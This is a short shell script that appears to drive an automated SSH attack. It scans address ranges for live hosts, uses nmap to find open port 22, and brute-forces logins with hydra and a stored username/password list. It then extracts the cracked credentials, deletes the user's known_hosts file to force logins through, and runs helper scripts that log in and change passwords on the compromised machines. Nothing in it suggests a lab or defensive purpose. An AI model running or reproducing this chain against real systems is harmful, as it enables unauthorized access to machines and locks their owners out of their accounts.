bash ipScan.sh #output to lib/liveIps
python ipCleanup.py #output to lib/ips
nmap -iL lib/ips -p22 -oN lib/sshOpen -Pn #port scan
python portCleanup.py > lib/ipOpen

hydra -C usr/userpass.lst -M lib/ipOpen -o log/found -t 1 ssh

python passClean.py > lib/creds
rm ~/.ssh/known_hosts #clear known devices to force login to work

#logon with creds and execute
python generate.py #output to lib/creds
python change.py #changes passwords
